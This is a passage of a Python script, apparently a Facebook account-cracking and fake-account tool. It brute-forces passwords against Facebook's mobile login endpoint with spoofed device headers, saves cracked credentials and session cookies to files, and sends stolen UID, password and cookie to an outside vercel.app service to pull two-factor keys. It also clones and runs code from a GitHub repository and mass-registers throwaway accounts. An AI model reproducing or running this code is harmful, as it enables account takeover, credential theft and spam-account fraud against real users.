'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
			po = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
			if "session_key" in po:
				token = po["access_token"]
			usmi=session.cookies.get_dict().keys()
			if "c_user" in usmi:
				print(f'\r\r{GREEN} [LEGEND-USMII-OK] {str(ids)} | {pas}{WHITE}')
				break
			if "checkpoint" in usmi:
				print(f'\r\r{RED} [LEGEND-USMII-CP] {str(ids)} | {pas}{WHITE}')
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("Internet Connection Error\nSleeping for 60s")
		time.sleep(60)
		#pass
	except Exception as e:
		print(e)
		time.sleep(20)
		#pass

#-> rndm Method <-#
def rndm(ids,passlist):
	global loop, oks, cps, proxies
	sys.stdout.write('\r\r%s [USMII-RUNING] %s|%sOK:-%s %s'%(WHITE_BOLD, loop, WHITE_BOLD, len(oks), WHITE_BOLD));sys.stdout.flush()
	try:
		for pas in passlist:
			ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/Orca-Android;FBAV/20.0.0.19.13;FBLC/en_US;FBBV/6582265;FBCR/null;FBMF/zte;FBBD/zte;FBDV/Z730;FBSV/4.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=800};FB_FW/1;]'
			data = {'email': ids, 
'password': pas, 
'adid': str(uuid.uuid4()),
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'session_id': str(uuid.uuid4()),
'advertiser_id': str(uuid.uuid4()),
'reg_instance': str(uuid.uuid4()),
'logged_out_id': str(uuid.uuid4()),
'locale': 'en_NP', 
'client_country_code': 'NP', 
'cpl': 'true', 'source': 'login',
'format': 'json', 
'omit_response_on_success': 'false', 
'credentials_type': 'password',
'error_detail_type': 'button_with_disabled',
'generate_session_cookies': '1',
'generate_analytics_claim': '1',
'generate_machine_id': '1',
'tier': 'regular',
'currently_logged_in_userid': '0',
'fb_api_req_friendly_name': 'authenticate', 
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3', 
'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
            #content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
			headers = {'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'X-FB-Connection-Quality': 'EXCELLENT',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Friendly-Name': 'authenticate',
'Content-Type': 'application/x-www-form-urlencoded', 
"Content-Length": str(random.randint(500, 1099))}

			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'your account was locked' in po:
				pass
			elif 'session_key' in po:
				try:
					uid = po['uid']
				except:
					uid = ids
			
				if str(uid) in oks:
					break
				else:
					oks.append(str(uid))
					print(f'\r\r{GREEN} [LEGEND-USMII-OK] {str(uid)} | {pas}{WHITE}')
					coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					if show_cookies:
						print(f'\r\r{YELLOW} [Cookies] {coki}{WHITE}')
					open('/sdcard/usmii-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
					open('/sdcard/USMII-OK.txt','a').write(str(uid)+'|'+pas+'\n')
					break
			elif 'www.facebook.com' in po['error']['message']:
				try:
					uid = po['error']['error_data']['uid']
				except:
					uid = ids
				
				if uid in oks or uid in cps:
					pass
				else:
					cps.append(str(ids))
					if show_cp:
						print(f'\r\r{RED} [LEGEND-USMII-CP] {ids} | {pas}{WHITE}')
					open('/sdcard/USMII-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("Internet Connection Error\nSleeping for 60s")
		time.sleep(60)
		#pass
	except Exception as e:
		#print(e)
		time.sleep(20)
		#pass

#-> Two Factor <-#
def Auto2F():
	own="hannan"
	clear()
	id, ps, cookie = input(f"{WHITE} [✓] UID|PASS|COOKIE : ").split("|")
	linex()
	data = {"email": id,"password": ps,"cookie": cookie} 
	
	response = farhan_request("https://"+own+"-2f.vercel.app/2factor", "POST", data=data)
	response = json.loads(response)
	if response['Status'] == "Success":
		codes = response['2FCODES']
		keys = response['2FKEY']
		print(f"{GREEN} [✓] {WHITE}Success")
		linex()
		print(f"{GREEN} [✓] {WHITE}{id}")
		print(f"{GREEN} [✓] {WHITE}{ps}")
		linex()
		print(f"{GREEN} [✓] {WHITE}{keys}")
		linex()
		for i in codes:
			print(f"{GREEN} [✓] {WHITE}\t{i}")
			open('/sdcard/USMI-2F.txt','a').write(id+'|'+ps+'\n'+keys+'\n'+i+'\n')
	elif response['Status'] == "Error":
		print(f"{RED} [×] {WHITE}Failed")
		linex()
		print(f"{RED} [×] {WHITE}{id}")
		print(f"{RED} [×] {WHITE}{ps}")
		linex()
		print(f'{RED} [×] {WHITE}{response["error_message"]}')
		linex()
	
	input(" PRESS ENTER TO BACK ")
	menu()

#-> File Create <-#
def create():
	os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
	os.system('cd && cd FILE ;python FILE.py')

#-> Auto Create <-#
def Create():
	clear()
	
	def process(pas, mmail):
		ses = requests.Session()
		cookies = None
		ua = random_ua()
		mmail = Email().Mail()
		em = mmail['mail']
		num = "03"+rnd(10,49)+rnd(1111111,9999999)
		headers1 = {'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate','accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"','sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '21','upgrade-insecure-requests': '1','user-agent': ua}
		url1 = 'https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk'
		
		response1 = ses.get(url1, headers=headers1)	
		
		headers2 = {'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate','accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"','sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"',	'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '21','upgrade-insecure-requests': '1','user-agent': ua}
		url2 = 'https://mbasic.facebook.com/reg/submit/'
		data2 = {'lsd': find(response1.text,"lsd"),'jazoest': find(response1.text,"jazoest"),'ccp': '2','reg_instance': find(response1.text,"reg_instance"),'reg_impression_id': find(response1.text,"reg_impression_id"),'ns': '0','app_id': find(response1.text,"app_id"),'logger_id': find(response1.text,"logger_id"),'suma_create_event': 'suma_redirection_click_create_account','field_names[0]': 'firstname','field_names[1]': 'birthday_wrapper','field_names[2]': 'reg_email__','field_names[3]': 'sex','field_names[4]': 'reg_passwd__','is_birthday_confirmed': 'confirmed','multi_step_form': '1','skip_suma': '0','shouldForceMTouch': '1','ref': 'dbl','firstname': random.choice(m).split("|")[0]+" "+random.choice(m).split("|")[1],'reg_email__': num,'sex': '1','reg_passwd__':pas,'birthday_day': rnd(10,27),'birthday_month': '3','birthday_year': rnd(1978,1999),'welcome_step_completed': True,'submission_request': True,'age_step_input': False,'did_use_age': False,'custom_gender': False,'name_suggest_elig': False,'was_shown_name_suggestions': False,'did_use_suggested_name': False,'use_custom_gender': False,'zero_header_af_client': '','helper': '','guid': '','pre_form_step': '','korean_tos_is_present': '','checkbox_privacy_policy': '','checkbox_tos': '','checkbox_location_policy': ''}
		
		response = ses.post(url2, headers=headers2, data=data2)
		response = ses.get("https://mbasic.facebook.com")
		
		if "checkpoint" in response.text:
			return "chk"
		
		headers = {'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate','accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"','sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '21','upgrade-insecure-requests': '1','user-agent': ua}
		for i in re.findall('href="/changeemail(.*?)"',response.text):
			url="/changeemail"+i
		
		response = ses.get("https://mbasic.facebook.com"+url, headers=headers)
		
		headers = {'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate','accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"','sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '21','upgrade-insecure-requests': '1','user-agent': ua}
		data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(response.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),'old_email': re.search('name="old_email" value="(.*?)"',str(response.text)).group(1),'reg_instance': re.search('name="reg_instance" value="(.*?)"',str(response.text)).group(1),'new': em,'next': '','submit': 'Add'}
		url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text)[0]
		
		submit = ses.post(url, headers=headers, data=data)
		
		r = ses.get("https://mbasic.facebook.com")
		while True:
			h = Email(mmail["session"]).inbox()
			if h:
				j = h['topic'].split('-')[1];hh = j.split(' ')[0]
				cd = hh
				break
		headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate','accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not;A-Brand";v="99","Chromium";v="112"','sec-ch-ua-full-version-list': '"Not;A-Brand";v="99.0.0.0","Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-ua-platform-version': '11.0.0','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
		data = {'contact': em,'type': 'submit','is_soft_cliff': False,'medium': 'email','code': cd,'fb_dtsg': find(r.text,"fb_dtsg"),'jazoest': find(r.text,"jazoest"),'__user': dict(requests.cookies)['c_user']}
		url = 'https://m.facebook.com/confirmation_cliff/'
		response = ses.post(url, headers=headers, data=data)
		return ses
	def strt():
		try:
			global ok,loop,cp,ok1
			import sys
			loop += 1
			sys.stdout.write(f'\r\r%s [USMI-CREATE] %sOK:%s %s'%(WHITE_BOLD, GREEN, ok, WHITE_BOLD));sys.stdout.flush()
			ses = requests.Session()
			from fake_email import Email
			mmail = Email().Mail()
			em = mmail['mail']
			ua = random_ua()
			hd = {'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/reg', 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent':ua}
			
			pas = random.choice(m).replace('|','').lower()+rnd(1111,9999)
			req = process(pas,mmail)
			if req=="chk":
				cp += 1
			elif req == "0":
				pass
			else:
				dc = dict(req.cookies)
				cok = ";".join([k+"="+v for k,v in dc.items()])
				uid = re.findall("c_user=(.*?);",cok)[0]
				coki = cvt('ok',req.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
				print(f"\r\r{GREEN} [USMI-OK] {uid}|{pas}|{coki}")
				ok += 1
				open('/sdcard/USMI-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				linex()
		except Exception as e:
			if not "urllib" and not "perma" in str(e):
				print(e)
	
	file="/sdcard/USMI/CREATE-OK.txt"
	u=5000
	clear()
	
	
	linex()
	for i in range(50000):
		time.sleep(2)
		thread(max_workers=10).submit(strt)


menu()